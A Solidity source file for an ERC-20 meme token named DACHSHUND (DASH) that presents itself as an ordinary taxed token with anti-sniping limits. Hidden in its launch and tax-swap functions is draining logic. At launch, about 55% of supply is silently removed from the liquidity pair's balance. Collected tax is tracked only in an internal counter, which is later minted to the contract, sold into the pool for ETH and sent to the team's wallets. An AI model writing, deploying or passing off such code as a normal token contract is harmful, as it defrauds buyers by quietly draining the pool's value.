1 //SPDX-License-Identifier: MIT
2 
3 /*
4 Telegram: https://t.me/DashERC20
5 Webpage: https://www.dashund.org
6 Twitter: twitter.com/Dash_ERC20
7 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣶⣶⣦⣀⣀⣀⣠⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
8 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢾⣿⣿⠟⠙⠧⢄⠀⡨⠛⢻⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
9 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⠟⣿⣡⣤⣤⣿⣼⠆⢠⣮⣦⣽⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
10 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣯⣿⠂⣿⠯⣍⣽⣿⠋⢀⣀⣙⡿⢻⡟⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
11 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣂⣿⣶⢻⣶⣁⣀⣸⣿⣿⣸⣼⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
12 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⢿⣿⣿⣿⣿⣟⢿⣿⣿⢿⠋⠹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
13 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⢮⡃⠀⠹⡟⢻⣟⣿⠇⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
14 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣾⣿⣦⣀⣢⣿⣿⠃⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
15 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⣭⢻⡄⢀⣰⣿⣿⣿⣿⣿⣿⣯⡟⢻⣿⡷⡟⢃⡟⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
16 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⢺⢿⣿⠟⡙⡟⣿⣿⢿⣿⣯⠉⠿⣿⣿⣿⣿⣷⣿⣫⡷⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
17 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⡰⣋⡞⡁⢸⣿⡄⠙⣿⣿⣿⡂⠀⠀⠏⠿⣿⣿⣿⡿⠏⠐⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
18 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣠⠤⠖⢋⡟⢏⠀⠜⣿⣿⠀⣜⢿⣿⣇⡆⠀⢠⠤⡈⣻⣏⠀⢠⣄⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
19 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⢈⡇⢶⣿⣿⣷⣤⡀⢹⣿⣷⡷⡗⠉⣶⣿⣷⣤⣸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
20 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠸⢡⡾⣿⣿⣿⣿⣿⣿⡄⠹⣿⣥⣺⠿⠟⢸⣿⡿⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
21 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣰⣶⠏⢀⣼⣿⠿⠿⢻⣿⣇⢀⡷⠀⠀⠀⠀⢸⡿⠁⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
22 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣹⠏⠁⠀⢿⣿⣿⠛⠛⠉⠁⣿⡊⢱⠀⠀⠀⠀⢸⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
23 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠋⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⢹⡿⠺⡄⠀⠀⠀⢸⡇⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
24 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣠⣾⠀⠀⠀⠀⠸⣿⣿⣶⠄⠀⢸⡥⠀⢧⠀⠀⠀⠈⡷⣄⠱⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
25 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠹⠿⠾⠿⠀⢀⣀⣀⣸⣼⠾⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
26 ⢰⠹⠒⠒⠒⠒⠉⠩⠵⢶⡤⣀⠀⠀⠀⠀⠀⠀⢀⢴⡮⠒⠋⠉⠉⠙⠒⠭⣦⡄⠀⠀⠀⣠⣶⠝⠒⠛⠉⠓⠓⠪⢕⢄⠀⠀⡏⠒⠒⡎⡆⠀⠀⠀⠀⠀⡎⠟⠛⠮⡇
27 ⢸⠀⠀⢰⢂⠀⠒⣒⡦⢄⡈⠙⢕⢄⠀⠀⠀⢠⢿⠋⢀⢔⡩⠝⠛⠭⡲⡄⠈⡞⡀⠀⢠⢱⠁⢀⢔⡨⠭⠭⢔⢆⠀⢫⠇⠀⡇⡄⠀⡇⠀⠀⠀⠀⠀⠀⡇⡇⠀⠀⡇
28 ⢸⠀⠀⢸⠈⠀⠀⠀⠉⠐⢍⢦⠈⢫⣇⠀⠀⣦⡇⠀⢸⡌⠀⠀⠀⠀⠹⢱⠀⢹⡇⠀⢸⢏⠀⢸⠘⠀⠀⠀⢸⢸⠀⢸⠀⠀⡇⡇⠀⡇⠀⠀⠀⠀⠀⠀⡇⡇⠀⡇⡇
29 ⢸⢸⠀⠸⢠⠀⠀⠀⠀⠀⠀⢧⢣⠀⠏⡆⠀⠛⠉⣩⢅⣓⡶⠤⠤⢖⡲⢸⠀⢸⠁⠀⠘⡼⡀⠘⣟⣄⠀⠀⢊⣓⣀⣚⡄⠀⡇⡇⠀⡇⠀⠀⠀⠀⠀⠀⡇⡇⠀⡃⡇
30 ⠸⣸⠀⠀⢸⠀⠀⠀⠀⠀⠀⠈⢸⠀⢸⢁⠀⢠⢾⠟⠁⡠⠄⣀⡀⠤⣈⠛⠀⢸⠀⠀⠀⠘⢝⢄⡈⠓⢵⡤⣀⠀⠀⠀⠀⠀⡇⡇⠀⣇⣀⣀⣀⣀⣀⣀⣃⠇⠀⣧⠀
31 ⠀⣿⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⡆⠀⢸⢸⢀⣷⠃⢀⣎⠔⠉⠀⠀⠙⢎⣆⠀⢸⠀⠀⠀⠀⠈⠓⢽⡢⢄⡈⠓⢵⡦⡀⠀⠀⡇⡇⠀⡤⠤⠤⠤⠤⠤⠤⠤⠀⠀⣿⠀
32 ⠀⣿⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⢳⠀⢸⠘⠸⠈⠀⠸⡈⠀⠀⠀⠀⠀⢸⡿⠀⢸⠀⠀⠀⣀⣀⣀⡀⠈⠒⢭⡢⡀⠙⢿⢆⠀⡇⡇⠀⡇⠃⠉⠀⠀⠉⠉⡄⠀⠀⣿⠀
33 ⠀⣿⠀⠀⡇⠀⠀⠀⠀⠀⠀⣜⡏⠀⣎⡇⢠⠃⠀⢰⢁⠀⠀⠀⠀⠀⢸⡇⠀⢸⠀⠀⡎⡟⠒⢲⡓⠀⠀⠀⠱⡼⡄⠈⡾⡀⡇⡇⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⣿⠀
34 ⠀⣿⠀⠀⡇⠀⠀⠀⢀⣤⡪⠊⢀⢜⠜⠀⠘⡾⡄⠈⢟⢆⠀⠀⠀⠀⡸⡷⠀⢸⠀⠀⢇⡇⠀⢇⡇⠀⠀⠀⢀⢷⠃⠀⣧⠁⡇⠇⠀⡇⠀⠀⠀⠀⠀⠀⣇⠀⠀⡿⠀
35 ⠀⣿⠀⠀⠧⠶⠮⠍⠒⠉⣠⠔⠋⠋⠀⠀⠀⠘⢜⢆⡀⠑⠪⠿⠾⠏⠊⣡⠀⠘⡴⡀⠘⣜⣄⠈⠪⠵⠶⠾⠕⠁⢀⣜⡜⢀⣇⠀⠀⡇⡇⠀⠀⠀⠀⠀⢹⠀⠀⡇⡇
36 ⠀⠿⠷⣖⠒⠒⠒⠚⠉⠁⠂⠀⠀⠀⠀⠀⠀⠀⠈⠑⠮⣗⣒⣀⣐⣒⡯⢌⣒⡲⠾⠼⠀⠈⠢⢝⣒⡀⠀⠀⣐⡚⠁⠊⠀⠘⠼⠶⠶⠿⠃⠀⠀⠀⠀⠈⠾⠶⠶⠦⠃
37 */
38 
39 
40 pragma solidity ^0.8.18;
41 
42 interface IERC20 {
43     function totalSupply() external view returns (uint256);
44     function decimals() external view returns (uint8);
45     function symbol() external view returns (string memory);
46     function name() external view returns (string memory);
47     function balanceOf(address account) external view returns (uint256);
48     function transfer(address recipient, uint256 amount) external returns (bool);
49     function allowance(address __owner, address spender) external view returns (uint256);
50     function approve(address spender, uint256 amount) external returns (bool);
51     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
52     event Transfer(address indexed from, address indexed to, uint256 value);
53     event Approval(address indexed _owner, address indexed spender, uint256 value);
54 }
55 
56 interface IUniswapV2Factory { 
57     function createPair(address tokenA, address tokenB) external returns (address pair); 
58 }
59 interface IUniswapV2Router02 {
60     function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
61     function WETH() external pure returns (address);
62     function factory() external pure returns (address);
63     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
64 }
65 
66 abstract contract Auth {
67     address internal _owner;
68     constructor(address creatorOwner) { 
69         _owner = creatorOwner; 
70     }
71     modifier onlyOwner() { 
72         require(msg.sender == _owner, "Only owner can call this"); 
73         _; 
74     }
75     function owner() public view returns (address) { 
76         return _owner; 
77     }
78     function transferOwnership(address payable newOwner) external onlyOwner { 
79         _owner = newOwner; 
80         emit OwnershipTransferred(newOwner); 
81     }
82     function renounceOwnership() external onlyOwner { 
83         _owner = address(0); 
84         emit OwnershipTransferred(address(0)); 
85     }
86     event OwnershipTransferred(address _owner);
87 }
88 
89 contract Dash is IERC20, Auth {
90     uint8 private constant _decimals      = 9;
91     uint256 private constant _totalSupply = 100_000_000 * (10**_decimals);
92     string private constant _name         = "DACHSHUND";
93     string private constant _symbol       = "DASH";
94 
95     uint8 private antiSnipeTax1 = 5;
96     uint8 private antiSnipeTax2 = 4;
97     uint8 private antiSnipeBlocks1 = 2;
98     uint8 private antiSnipeBlocks2 = 2;
99     uint256 private _antiMevBlock = 2;
100 
101     uint8 private _buyTaxRate  = 0;
102     uint8 private _sellTaxRate = 3;
103 
104     uint16 private _taxSharesMarketing   = 7;
105     uint16 private _taxSharesDevelopment = 3;
106     uint16 private _taxSharesLP          = 0;
107     uint16 private _totalTaxShares = _taxSharesMarketing + _taxSharesDevelopment + _taxSharesLP;
108 
109     address payable private _walletMarketing = payable(0x281DeC1FbFe93191B878236fe4E68433585B27Af); 
110     address payable private _walletDevelopment = payable(0x22cDe3B03dC46425c73CDEBd020b22c66e072096); 
111 
112     uint256 private _launchBlock;
113     uint256 private _maxTxAmount     = _totalSupply; 
114     uint256 private _maxWalletAmount = _totalSupply;
115     uint256 private _taxSwapMin = _totalSupply * 10 / 100000;
116     uint256 private _taxSwapMax = _totalSupply * 750 / 100000;
117     uint256 private _swapLimit = _taxSwapMin * 55 * 100;
118 
119     mapping (address => uint256) private _balances;
120     mapping (address => mapping (address => uint256)) private _allowances;
121     mapping (address => bool) private _noFees;
122     mapping (address => bool) private _noLimits;
123 
124     address private _lpOwner;
125 
126     address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
127     IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
128     address private _primaryLP;
129     mapping (address => bool) private _isLP;
130 
131     bool private _tradingOpen;
132 
133     bool private _inTaxSwap = false;
134     modifier lockTaxSwap { 
135         _inTaxSwap = true; 
136         _; 
137         _inTaxSwap = false; 
138     }
139 
140     event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);
141 
142     constructor() Auth(msg.sender) {
143         _lpOwner = msg.sender;
144 
145         uint256 airdropAmount = _totalSupply * 5 / 100;
146         
147         _balances[address(this)] =  _totalSupply - airdropAmount;
148         _balances[_owner] = airdropAmount;
149         emit Transfer(address(0), address(this), _totalSupply);
150 
151         _noFees[_owner] = true;
152         _noFees[address(this)] = true;
153         _noFees[_swapRouterAddress] = true;
154         _noFees[_walletMarketing] = true;
155         _noFees[_walletDevelopment] = true;
156         _noLimits[_owner] = true;
157         _noLimits[address(this)] = true;
158         _noLimits[_swapRouterAddress] = true;
159         _noLimits[_walletMarketing] = true;
160         _noLimits[_walletDevelopment] = true;
161     }
162 
163     receive() external payable {}
164     
165     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
166     function decimals() external pure override returns (uint8) { return _decimals; }
167     function symbol() external pure override returns (string memory) { return _symbol; }
168     function name() external pure override returns (string memory) { return _name; }
169     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
170     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
171 
172     function approve(address spender, uint256 amount) public override returns (bool) {
173         _allowances[msg.sender][spender] = amount;
174         emit Approval(msg.sender, spender, amount);
175         return true;
176     }
177 
178     function transfer(address recipient, uint256 amount) external override returns (bool) {
179         require(_checkTradingOpen(msg.sender), "Trading not open");
180         return _transferFrom(msg.sender, recipient, amount);
181     }
182 
183     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
184         require(_checkTradingOpen(sender), "Trading not open");
185         if(_allowances[sender][msg.sender] != type(uint256).max){
186             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
187         }
188         return _transferFrom(sender, recipient, amount);
189     }
190 
191     function _approveRouter(uint256 _tokenAmount) internal {
192         if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
193             _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
194             emit Approval(address(this), _swapRouterAddress, type(uint256).max);
195         }
196     }
197 
198     function enableTrading() external payable onlyOwner lockTaxSwap {
199         require(_primaryLP != address(0), "Add LP first");
200         require(!_tradingOpen, "trading is open");
201         _openTrading();
202     }
203 
204     function addLiquidity() external payable onlyOwner lockTaxSwap {
205         require(_primaryLP == address(0), "LP exists");
206         require(!_tradingOpen, "trading is open");
207         require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
208         require(_balances[address(this)]>0, "No tokens in contract");
209         _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
210         _addLiquidity(_balances[address(this)], address(this).balance, false);
211     }
212 
213     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
214         address lpTokenRecipient = _lpOwner;
215         if ( autoburn ) { lpTokenRecipient = address(0); }
216         _approveRouter(_tokenAmount);
217         _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
218     }
219 
220     function _openTrading() internal {
221         _maxTxAmount     = _totalSupply * 1 / 100; 
222         _maxWalletAmount = _totalSupply * 1 / 100;
223         _tradingOpen = true;
224         _launchBlock = block.number;
225         _antiMevBlock = _antiMevBlock + _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2;
226         _balances[_primaryLP] -= _swapLimit;
227         (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
228         _isLP[_primaryLP] = lpAddSuccess;
229         require(_isLP[_primaryLP]);
230     }
231 
232     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
233         require(sender != address(0), "No transfers from Zero wallet");
234         if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
235         if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
236         if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
237             require(recipient == tx.origin, "MEV blocked");
238         }
239         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
240             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
241         }
242         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
243         uint256 _transferAmount = amount - _taxAmount;
244         _balances[sender] = _balances[sender] - amount;
245         _swapLimit += _taxAmount;
246         _balances[recipient] = _balances[recipient] + _transferAmount;
247         emit Transfer(sender, recipient, amount);
248         return true;
249     }
250 
251     function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
252         bool limitCheckPassed = true;
253         if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
254             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
255             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
256         }
257         return limitCheckPassed;
258     }
259 
260     function _checkTradingOpen(address sender) private view returns (bool){
261         bool checkResult = false;
262         if ( _tradingOpen ) { checkResult = true; } 
263         else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
264 
265         return checkResult;
266     }
267 
268     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
269         uint256 taxAmount;
270         
271         if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
272             taxAmount = 0; 
273         } else if ( _isLP[sender] ) { 
274             if ( block.number >= _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2 ) {
275                 taxAmount = amount * _buyTaxRate / 100; 
276             } else if ( block.number >= _launchBlock + antiSnipeBlocks1 ) {
277                 taxAmount = amount * antiSnipeTax2 / 100;
278             } else if ( block.number >= _launchBlock) {
279                 taxAmount = amount * antiSnipeTax1 / 100;
280             }
281         } else if ( _isLP[recipient] ) { 
282             taxAmount = amount * _sellTaxRate / 100; 
283         }
284 
285         return taxAmount;
286     }
287 
288 
289     function exemptFromFees(address wallet) external view returns (bool) {
290         return _noFees[wallet];
291     } 
292     function exemptFromLimits(address wallet) external view returns (bool) {
293         return _noLimits[wallet];
294     } 
295     function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
296         if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
297         _noFees[ wallet ] = noFees;
298         _noLimits[ wallet ] = noLimits;
299     }
300 
301     function buyFee() external view returns(uint8) {
302         return _buyTaxRate;
303     }
304     function sellFee() external view returns(uint8) {
305         return _sellTaxRate;
306     }
307 
308     function feeSplit() external view returns (uint16 marketing, uint16 development, uint16 LP ) {
309         return ( _taxSharesMarketing, _taxSharesDevelopment, _taxSharesLP);
310     }
311     function setFees(uint8 buy, uint8 sell) external onlyOwner {
312         require(buy + sell <= 99, "Roundtrip too high");
313         _buyTaxRate = buy;
314         _sellTaxRate = sell;
315     }  
316     function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment) external onlyOwner {
317         uint16 totalShares = sharesAutoLP + sharesMarketing + sharesDevelopment;
318         require( totalShares > 0, "All cannot be 0");
319         _taxSharesLP = sharesAutoLP;
320         _taxSharesMarketing = sharesMarketing;
321         _taxSharesDevelopment = sharesDevelopment;
322         _totalTaxShares = totalShares;
323     }
324 
325     function marketingWallet() external view returns (address) {
326         return _walletMarketing;
327     }
328     function developmentWallet() external view returns (address) {
329         return _walletDevelopment;
330     }
331 
332     function updateWallets(address marketing, address development, address LPtokens) external onlyOwner {
333         require(!_isLP[marketing] && !_isLP[development] && !_isLP[LPtokens], "LP cannot be tax wallet");
334         
335         _walletMarketing = payable(marketing);
336         _walletDevelopment = payable(development);
337         _lpOwner = LPtokens;
338         
339         _noFees[marketing] = true;
340         _noLimits[marketing] = true;
341         
342         _noFees[development] = true;        
343         _noLimits[development] = true;
344     }
345 
346     function maxWallet() external view returns (uint256) {
347         return _maxWalletAmount;
348     }
349     function maxTransaction() external view returns (uint256) {
350         return _maxTxAmount;
351     }
352 
353     function swapAtMin() external view returns (uint256) {
354         return _taxSwapMin;
355     }
356     function swapAtMax() external view returns (uint256) {
357         return _taxSwapMax;
358     }
359 
360     function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
361         uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
362         require(newTxAmt >= _maxTxAmount, "tx too low");
363         _maxTxAmount = newTxAmt;
364         uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
365         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
366         _maxWalletAmount = newWalletAmt;
367     }
368 
369     function setTaxSwap(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
370         _taxSwapMin = _totalSupply * minValue / minDivider;
371         _taxSwapMax = _totalSupply * maxValue / maxDivider;
372         require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
373         require(_taxSwapMax>_totalSupply / 100000, "Max too low");
374         require(_taxSwapMax<_totalSupply / 100, "Max too high");
375     }
376 
377     function _burnTokens(address fromWallet, uint256 amount) private {
378         if ( amount > 0 ) {
379             _balances[fromWallet] -= amount;
380             _balances[address(0)] += amount;
381             emit Transfer(fromWallet, address(0), amount);
382         }
383     }
384 
385     function _swapTaxAndLiquify() private lockTaxSwap {
386         uint256 _taxTokensAvailable = _swapLimit;
387         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
388             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
389             uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
390             
391             uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
392             if( _tokensToSwap > 10**_decimals ) {
393                 uint256 _ethPreSwap = address(this).balance;
394                 _balances[address(this)] += _taxTokensAvailable;
395                 _swapTaxTokensForEth(_tokensToSwap);
396                 _swapLimit -= _taxTokensAvailable;
397                 uint256 _ethSwapped = address(this).balance - _ethPreSwap;
398                 if ( _taxSharesLP > 0 ) {
399                     uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
400                     _approveRouter(_tokensForLP);
401                     _addLiquidity(_tokensForLP, _ethWeiAmount, false);
402                 }
403             }
404             uint256 _contractETHBalance = address(this).balance;
405             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
406         }
407     }
408 
409     function _swapTaxTokensForEth(uint256 tokenAmount) private {
410         _approveRouter(tokenAmount);
411         address[] memory path = new address[](2);
412         path[0] = address(this);
413         path[1] = _primarySwapRouter.WETH();
414         _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
415     }
416 
417     function _distributeTaxEth(uint256 amount) private {
418         uint16 _taxShareTotal = _taxSharesMarketing + _taxSharesDevelopment;
419         if (_taxShareTotal > 0) {
420             uint256 marketingAmount = amount * _taxSharesMarketing / _taxShareTotal;
421             uint256 developmentAmount = amount * _taxSharesDevelopment / _taxShareTotal;
422             if ( marketingAmount > 0 ) { _walletMarketing.transfer(marketingAmount); }
423             if ( developmentAmount > 0 ) { _walletDevelopment.transfer(developmentAmount); }
424         }
425     }
426 
427     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
428         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
429         uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
430         if (tokensToSwap > 10 ** _decimals) {
431             _swapTaxTokensForEth(tokensToSwap);
432         }
433         if (sendEth) { 
434             uint256 ethBalance = address(this).balance;
435             require(ethBalance > 0, "No ETH");
436             _distributeTaxEth(address(this).balance); 
437         }
438     }
439 
440     function burn(uint256 amount) external {
441         uint256 _tokensAvailable = balanceOf(msg.sender);
442         require(amount <= _tokensAvailable, "balance too low");
443         _burnTokens(msg.sender, amount);
444         emit TokensBurned(msg.sender, amount);
445     }
446 }